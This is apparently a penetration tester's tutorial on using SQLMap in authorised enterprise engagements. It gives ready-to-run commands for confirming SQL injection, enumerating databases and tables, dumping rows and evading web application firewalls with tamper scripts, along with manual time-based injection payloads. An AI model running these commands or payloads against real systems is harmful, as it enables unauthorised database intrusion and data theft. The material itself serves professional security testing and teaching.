# SQLMap — Enterprise Penetration Testing Usage Guide

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 6+ Years Enterprise AppSec
>
> **Category:** Tool Mastery — SQL Injection Automation
>
> **Context:** SQLMap is a powerful tool that enterprise penetration testers use for confirming and enumerating SQL injection vulnerabilities discovered manually. This is the critical distinction — I never run SQLMap blind against an application to discover injections. I discover injection points manually in Burp Suite, confirm the vulnerability with a few manual payloads, and then use SQLMap to efficiently enumerate the database structure and demonstrate impact. Running SQLMap without prior manual confirmation risks false positives, unnecessary server load, and potential data corruption in production environments.

---

## ⚠️ Professional Usage Principles

```
BEFORE running SQLMap in any enterprise engagement:
  1. Confirm the injection manually in Burp Repeater first
  2. Verify you have explicit written scope permission
  3. Use --level and --risk conservatively (default: 1,1)
  4. Route through Burp proxy for full logging and evidence capture
  5. Use --technique to limit to safe techniques only
  6. NEVER run on production with --dump or --os-cmd without explicit authorisation

SQLMap is an enumeration tool in professional engagements.
It is not a "fire and forget" attack tool.
```

---

## 🔧 Core Commands for Enterprise Testing

### Basic Vulnerability Confirmation

```bash
# GET parameter injection (most common)
sqlmap -u "https://app.company.com/api/reports?ref_id=1" \
  --batch \
  --level=1 \
  --risk=1

# POST parameter (JSON API body)
sqlmap -u "https://app.company.com/api/search" \
  --data='{"query":"test","page":1}' \
  --headers="Content-Type: application/json" \
  --batch

# Authenticated request (cookie from Burp)
sqlmap -u "https://app.company.com/reports?id=1" \
  --cookie="session=eyJhbGciOiJIUzI1NiJ9..." \
  --batch

# Route through Burp proxy (recommended — captures all SQLMap traffic for evidence)
sqlmap -u "https://app.company.com/api/users?id=1" \
  --proxy=http://127.0.0.1:8080 \
  --batch
```

### Using a Saved Burp Request File

```bash
# Best practice: save the raw HTTP request from Burp, feed to SQLMap
# In Burp Repeater: right-click → Copy as curl, or:
# Right-click request → Save item → save as request.txt

sqlmap -r /path/to/request.txt --batch

# Content of request.txt:
GET /api/reports?ref_id=1 HTTP/1.1
Host: app.company.com
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
Cookie: session=abc123
User-Agent: Mozilla/5.0...
```

### Database Enumeration (After Confirmation)

```bash
# Enumerate databases (safe — read-only)
sqlmap -u "https://target.com/api/users?id=1" \
  --cookie="session=..." \
  --dbs \
  --batch

# Enumerate tables in specific database
sqlmap -u "https://target.com/api/users?id=1" \
  --cookie="session=..." \
  -D production_db \
  --tables \
  --batch

# Enumerate columns in target table
sqlmap -u "https://target.com/api/users?id=1" \
  --cookie="session=..." \
  -D production_db \
  -T users \
  --columns \
  --batch

# Dump limited rows for PoC (use sparingly, document the minimum)
sqlmap -u "https://target.com/api/users?id=1" \
  --cookie="session=..." \
  -D production_db \
  -T users \
  -C "username,email" \
  --dump \
  --start=1 \
  --stop=3 \
  --batch
# Note: dump only 3 rows maximum for PoC evidence — do not extract the full table
```

### Technique-Specific Testing

```bash
# Time-based blind only (least intrusive, good for APIs)
sqlmap -u "https://target.com/api/users?id=1" \
  --technique=T \
  --time-sec=3 \
  --batch

# Boolean-based blind only
sqlmap -u "https://target.com/api/users?id=1" \
  --technique=B \
  --batch

# Error-based only (fastest when verbose errors shown)
sqlmap -u "https://target.com/api/users?id=1" \
  --technique=E \
  --batch

# Union-based only (requires knowing column count first)
sqlmap -u "https://target.com/api/users?id=1" \
  --technique=U \
  --union-cols=5 \
  --batch
```

### WAF Bypass Tamper Scripts

```bash
# When WAF is blocking standard payloads
sqlmap -u "https://target.com/api/users?id=1" \
  --tamper=space2comment,randomcase,between \
  --batch

# Common tamper scripts:
  space2comment     → replaces spaces with /**/ (bypasses space-based WAF rules)
  randomcase        → RaNdOmIzEs keyword case (bypasses case-sensitive WAFs)
  between           → replaces > with NOT BETWEEN 0 AND (evasion)
  base64encode      → Base64 encodes the payload
  charencode        → URL encodes characters
  equaltolike       → replaces = with LIKE
  hex2char          → hex-encodes string literals

# Combine multiple tampers for stubborn WAFs:
--tamper=space2comment,randomcase,charencode,between
```

---

## 🏢 Enterprise Workflow: Manual Confirm → SQLMap Enumerate

```
My actual enterprise workflow:

Step 1 — Manual discovery in Burp Repeater:
  Inject: GET /api/reports?ref_id=1'
  → Note error type (SQL syntax error = error-based possible)
  
  Inject: GET /api/reports?ref_id=1 AND SLEEP(5)--
  → Note 5-second delay = time-based confirmed
  
  Once manually confirmed → proceed to SQLMap

Step 2 — SQLMap confirmation (--dbs only):
  sqlmap -u "https://app.company.com/api/reports?ref_id=1" \
    --cookie="session=..." \
    --dbs \
    --batch \
    --proxy=http://127.0.0.1:8080
  
  → If SQLMap confirms injection and returns DB names = vulnerability confirmed
  → Screenshot: DB names returned = PoC ready

Step 3 — Limited enumeration for report:
  --tables on the production database
  --columns on the users table
  --dump 3 rows of username+email (no passwords, no PII beyond what's needed)

Step 4 — Stop here, write the finding:
  The PoC is: "Attacker can enumerate database structure and extract data"
  Do NOT: dump the entire user table, attempt xp_cmdshell, pivot further
  Document: endpoint, injection type, DB name, table names, 3 sample rows
```

---

## 📋 SQLMap in Enterprise Pentest Reports

```
SQLMap output to include in reports:
  1. Screenshot of --dbs output showing database names
  2. Screenshot of --tables output showing table structure
  3. Screenshot of --columns showing column names
  4. Optional: 3-row dump of non-sensitive columns (username only, no passwords)

Command to document in report:
  sqlmap -r request.txt -D production_db -T users -C username,email --dump --stop=3 --batch

Evidence chain:
  Manual confirmation (Burp screenshot) →
  SQLMap DB enumeration (screenshot) →
  Limited table dump (3 rows, redacted if needed) →
  Business impact statement
```

---

## 🧭 Key Takeaways

**1. Confirm manually in Burp before running SQLMap.**
SQLMap against an unconfirmed injection point wastes time, generates noise in server logs, and can return false negatives. A 5-minute manual confirmation in Burp Repeater means SQLMap runs with confidence and produces clean evidence.

**2. Route SQLMap through Burp proxy — always.**
`--proxy=http://127.0.0.1:8080` captures every SQLMap request in Burp HTTP History. This gives you a complete audit trail for the report and allows you to review exactly what payloads were sent if any questions arise later.

**3. Use --stop=3 on --dump. Never dump full tables.**
In enterprise engagements, the goal is to demonstrate impact, not to extract data. Three rows of username/email prove the vulnerability is exploitable. Dumping 50,000 user records creates unnecessary data handling obligations and is outside the scope of most penetration test engagements.

**4. Document the SQLMap command in the report.**
Including the exact SQLMap command used — endpoint, parameters, techniques — adds reproducibility to the finding. The client's team can run the same command in their test environment to verify the fix.

---

## 🔗 References
- [SQLMap Documentation](https://sqlmap.org)
- [SQLMap GitHub](https://github.com/sqlmapproject/sqlmap)
- [SQLMap Tamper Scripts](https://github.com/sqlmapproject/sqlmap/tree/master/tamper)

---
<div align="center">

*Part of [AppSec From The Trenches](README.md) — Real notes from 6+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
